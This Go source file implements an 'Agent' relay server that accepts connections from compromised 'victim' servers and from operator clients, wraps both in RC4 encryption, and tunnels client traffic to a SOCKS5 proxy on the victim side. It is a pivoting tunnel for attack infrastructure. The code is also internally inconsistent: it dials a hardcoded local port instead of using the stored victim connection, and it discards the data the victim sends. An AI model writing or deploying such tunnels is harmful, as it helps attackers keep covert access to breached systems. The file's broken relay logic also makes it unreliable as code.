package main

import (
	"context"
	"fmt"
	"log"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

// Agent represents the agent server that bridges victim server and clients
type Agent struct {
	key              string
	clientAddr       string // Address to listen for client connections
	internalAddr     string // Address to listen for victim server connections
	clientListener   net.Listener
	internalListener net.Listener
	wg               sync.WaitGroup
	shutdown         chan struct{}
	connCount        int32

	// Store victim connections
	victimConn  *RC4Conn
	victimMutex sync.RWMutex
}

// NewAgent creates a new agent instance
func NewAgent(key, clientAddr, internalAddr string) *Agent {
	return &Agent{
		key:          key,
		clientAddr:   clientAddr,
		internalAddr: internalAddr,
		shutdown:     make(chan struct{}),
	}
}

// Start starts the agent server
func (a *Agent) Start(ctx context.Context) error {
	// Start listening for victim server connections
	internalListener, err := net.Listen("tcp", a.internalAddr)
	if err != nil {
		return fmt.Errorf("failed to listen on internal address %s: %v", a.internalAddr, err)
	}
	a.internalListener = internalListener

	// Start listening for client connections
	clientListener, err := net.Listen("tcp", a.clientAddr)
	if err != nil {
		internalListener.Close()
		return fmt.Errorf("failed to listen on client address %s: %v", a.clientAddr, err)
	}
	a.clientListener = clientListener

	log.Printf("Agent listening for victim server on %s", a.internalAddr)
	log.Printf("Agent listening for clients on %s", a.clientAddr)

	// Accept victim server connections
	go a.acceptVictimConnections()

	// Accept client connections
	go a.acceptClientConnections()

	// Wait for shutdown
	<-a.shutdown
	return nil
}

// acceptClientConnections handles connections from clients
func (a *Agent) acceptClientConnections() {
	defer a.clientListener.Close()

	for {
		select {
		case <-a.shutdown:
			return
		default:
		}

		conn, err := a.clientListener.Accept()
		if err != nil {
			select {
			case <-a.shutdown:
				return
			default:
				log.Printf("Error accepting client connection: %v", err)
				continue
			}
		}

		// Handle client connection
		a.wg.Add(1)
		go func(clientConn net.Conn) {
			defer a.wg.Done()
			a.handleClientConnection(clientConn)
		}(conn)
	}
}

// handleClientConnection handles a connection from a client
func (a *Agent) handleClientConnection(clientConn net.Conn) {
	defer clientConn.Close()
	atomic.AddInt32(&a.connCount, 1)
	defer atomic.AddInt32(&a.connCount, -1)

	clientAddr := clientConn.RemoteAddr().String()
	log.Printf("New client connection from %s", clientAddr)

	// Create encrypted connection with client
	clientRC4, err := NewRC4Conn(clientConn, a.key)
	if err != nil {
		log.Printf("Error creating RC4 connection for client: %v", err)
		return
	}
	defer clientRC4.Close()

	// Check if we have a victim server connected (for status only)
	a.victimMutex.RLock()
	hasVictim := a.victimConn != nil
	a.victimMutex.RUnlock()

	if !hasVictim {
		log.Printf("No victim server connected for client %s", clientAddr)
		return
	}

	// Connect to victim server's SOCKS5 port
	victimConn, err := net.Dial("tcp", "127.0.0.1:9999")
	if err != nil {
		log.Printf("Failed to connect to victim SOCKS5 server for client %s: %v", clientAddr, err)
		return
	}
	defer victimConn.Close()

	// Create encrypted connection with victim
	victimRC4, err := NewRC4Conn(victimConn, a.key)
	if err != nil {
		log.Printf("Failed to create RC4 connection to victim for client %s: %v", clientAddr, err)
		return
	}
	defer victimRC4.Close()

	log.Printf("Established relay between client %s and victim SOCKS5 server", clientAddr)

	// Start bidirectional relay between client and victim
	relay(clientRC4, victimRC4)

	log.Printf("Client relay finished: %s", clientAddr)
}

// acceptVictimConnections handles connections from victim servers
func (a *Agent) acceptVictimConnections() {
	defer a.internalListener.Close()

	for {
		select {
		case <-a.shutdown:
			return
		default:
		}

		conn, err := a.internalListener.Accept()
		if err != nil {
			select {
			case <-a.shutdown:
				return
			default:
				log.Printf("Error accepting victim connection: %v", err)
				continue
			}
		}

		// Handle victim connection
		a.wg.Add(1)
		go func(victimConn net.Conn) {
			defer a.wg.Done()
			a.handleVictimConnection(victimConn)
		}(conn)
	}
}

// handleVictimConnection handles a connection from a victim server
func (a *Agent) handleVictimConnection(conn net.Conn) {
	defer conn.Close()
	atomic.AddInt32(&a.connCount, 1)
	defer atomic.AddInt32(&a.connCount, -1)

	log.Printf("New victim server connection from %s", conn.RemoteAddr())

	// Create encrypted connection
	rc4Conn, err := NewRC4Conn(conn, a.key)
	if err != nil {
		log.Printf("Error creating RC4 connection for victim: %v", err)
		return
	}

	// Store the victim connection for client relay
	a.victimMutex.Lock()
	a.victimConn = rc4Conn
	a.victimMutex.Unlock()

	log.Printf("Victim server connected and ready to handle SOCKS5 requests")

	// Keep the connection alive and handle it as a SOCKS5 connection
	// This connection will be used by client connections for relay
	buffer := make([]byte, 32*1024)
	for {
		select {
		case <-a.shutdown:
			a.victimMutex.Lock()
			a.victimConn = nil
			a.victimMutex.Unlock()
			return
		default:
		}

		// Set a read timeout to check for shutdown periodically
		rc4Conn.SetReadDeadline(time.Now().Add(5 * time.Second))
		n, err := rc4Conn.Read(buffer)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			log.Printf("Victim connection error: %v", err)
			break
		}

		if n > 0 {
			log.Printf("Received %d bytes from victim server", n)
		}
	}

	// Clear the victim connection
	a.victimMutex.Lock()
	a.victimConn = nil
	a.victimMutex.Unlock()

	log.Printf("Victim server disconnected")
}

// Shutdown shuts down the agent server
func (a *Agent) Shutdown(ctx context.Context) error {
	close(a.shutdown)

	if a.clientListener != nil {
		a.clientListener.Close()
	}
	if a.internalListener != nil {
		a.internalListener.Close()
	}

	// Wait for all goroutines to finish
	done := make(chan struct{})
	go func() {
		a.wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		return nil
	case <-ctx.Done():
		return ctx.Err()
	}
}
